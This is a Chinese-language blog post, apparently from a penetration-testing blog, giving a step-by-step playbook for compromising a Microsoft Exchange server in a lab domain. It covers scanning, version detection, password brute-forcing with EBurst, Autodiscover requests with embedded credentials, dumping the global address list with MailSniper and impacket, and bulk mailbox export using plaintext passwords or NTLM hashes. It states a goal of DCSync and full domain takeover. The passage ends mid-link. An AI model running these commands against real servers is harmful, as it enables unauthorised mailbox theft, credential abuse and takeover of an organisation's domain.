---
title: Exchange邮服渗透技巧 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18616373
source: 博客园 - 渗透测试中心
date: 2024-12-20
fetch_date: 2025-10-06T19:38:15.025599
---

# Exchange邮服渗透技巧 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [Exchange邮服渗透技巧](https://www.cnblogs.com/backlion/p/18616373 "发布于 2024-12-19 09:18")

在进行渗透过程中，Exchange邮件服务器通常是我们重点关注的对象，因为拿下了Exchange邮件服务器，凭借其机器账户的权限，我们可以赋予其他域内用户dcsync的权限，进而导出域内hash，拿下整个域。

**exchange系统的中配置powershell使用命令**

<https://learn.microsoft.com/zh-cn/powershell/module/exchange/add-mailboxfolderpermission?view=exchange-ps>

### 扫描服务

#### setspn.exe

> setspn.exe -T vvvv1.com -F -Q \*/\* | findstr exchange

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091750544-81945775.png)

#### nmap

> nmap 192.168.52.139 -A

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091751783-930962230.png)

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091753021-667849544.png)

#### 探测版本与漏洞

通过ews接口获得exchange精确版本信息

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091753920-1382274938.png)

缺点：部分旧的exchange版本不支持该操作。

通过owa接口获取exchange粗略版本信息

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091754632-1234835121.png)

获得版本号后，可以去官网查询对应的Exchange版本和发布日期。

查询地址：

<https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2016>

使用脚本检测版本与漏洞

<https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetVersion_MatchVul.py>

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091755479-745747281.png)

#### 爆破

> python2 EBurst.py -d 192.168.52.139 -C
>
> ![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091756380-514862124.png)

也可以使用该工具进行用户账户密码爆破。

> python2 EBurst.py -d 192.168.52.139 -L ./users.txt -P ./passwords.txt --ews

### 信息收集

假定目前以及获取到了其中一个邮箱用户的凭据，接下来就可以进行信息收集。

#### 通过Autodiscover进行信息收集

通过[https://Exchange/autodiscover/autodiscover.xml接口，可以接受xml请求并返回xml中指定的电子邮件所属邮箱配置。](https://exchange/autodiscover/autodiscover.xml%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%8E%A5%E5%8F%97xml%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%BF%94%E5%9B%9Exml%E4%B8%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%89%80%E5%B1%9E%E9%82%AE%E7%AE%B1%E9%85%8D%E7%BD%AE%E3%80%82)

因为NTLMv2 身份验证需要 HTTP/1.1 连接，而新版burpsuit默认HTTP/2，因此我们需要先进行调整。

<https://blog.csdn.net/qq_30786785/article/details/121742101>

读取配置等操作可以参考如下链接。

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange-Autodiscover%E7%9A%84%E4%BD%BF%E7%94%A8>

其中basic为身份验证，使用base64加密 VVVV1\administrator:admin!@#456

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: 192.168.52.139
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Basic VlZWVjFcYWRtaW5pc3RyYXRvcjphZG1pbiFAIzQ1Ng==
Content-Type: text/xml
Content-Length: 350

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>exchange1@vvvv1.com</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

如果不存在邮箱，则会返回

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091757089-260351829.png)

如果邮箱存在，则会返回配置信息

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091757878-269626730.png)

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091758413-143357763.png)

#### 获取exchange通讯录

全局地址列表（Global Address List，GAL）包含exchange组织所有的邮箱用户的邮件地址，只要获得exchange组织内任一邮箱用户的凭据，就可以导出其他邮箱用户的邮件地址。可以使用OWA、EWS、OAB、RPC over HTTP、MAPI over HTTP等方式获取GAL。

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95>

<https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/>

##### 利用OWA直接查看

人员->所有用户

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091759010-1679266742.png)

##### 通过/EWS接口获取GAL

> Powershell -ExecutionPolicy Bypass
>
> Import-Module .\MailSniper.ps1
>
> Get-GlobalAddressList -ExchHostname 192.168.52.139 -UserName VVVV1\administrator -Password admin!@#456 -OutFile gal.txt

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091759906-1324875600.png)

##### 通过OAB获取GAL

1.通过Autodiscover搜集到的OAB路径；

2.访问/OAB/OABURI/oab.xml；

3.通过oab.xml找到默认全局地址表对应的LZX文件地址，并访问/OAB/OABURI/LZXURI，得到LZX文件；

4.使用cabextract工具对LZX文件解码，即可还原出GAL；

<https://www.cabextract.org.uk/>

##### 通过RPC（MAPI） over HTTP导出GAL和信息收集

MAPI OVER HTTP是Outlook同Exchange2016之间默认的通信协议

MAPI OVER HTTP是Exchange Server 2013 Service Pack 1 (SP1)中实现的新传输协议，用来替代RPC OVER HTTP(也称作Outlook Anywhere)

Exchange2013默认没有启用MAPI OVER HTTP，Outlook同Exchange之间的通信协议使用RPC OVER HTTP

使用impacket-exchanger模块可以列出address list，找到对应的guid

> python exchanger.py VVVV1/admins:User!@#45@192.168.52.139 nspi list-tables

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091800757-902378061.png)

导出所有用户

> python exchanger.py VVVV1/admins:User!@#45@192.168.52.139 nspi dump-tables -guid 784f58c1-8bd1-4d28-81fa-52d22ce95738

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091801423-1154562484.png)

##### 通过python远程导出GAL

> python ewsManage\_Downloader.py 192.168.52.139 443 plaintext vvvv1.com admins User!@#45 findallpeople

##### ![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091802118-1356823030.png)

### 导出邮件内容

#### 通过/OWA接口直接下载邮件

通过输入账号密码，然后直接在页面中读取或下载邮件

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091802878-766328586.png)

#### 通过/EWS接口导出邮件内容

##### 通过python远程导出邮件

可以通过明文密码导出，也可以通过hash导出

> python ewsManage\_Downloader.py 192.168.52.139 443 plaintext vvvv1.com administrator admin!@#456 download
>
> python ewsManage\_Downloader.py test.com 80 ntlmhash NULL user1 c5a237b7e9d8e708d8436b6148a25fa1 findallpeople

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219091803573-122476176.png)

通过python导出邮件一般情况下使用SOAP XML message导出

XML元素官方文档：

<https://learn.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchange>

##### 通过exshell.ps1导出邮件

<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8EExc...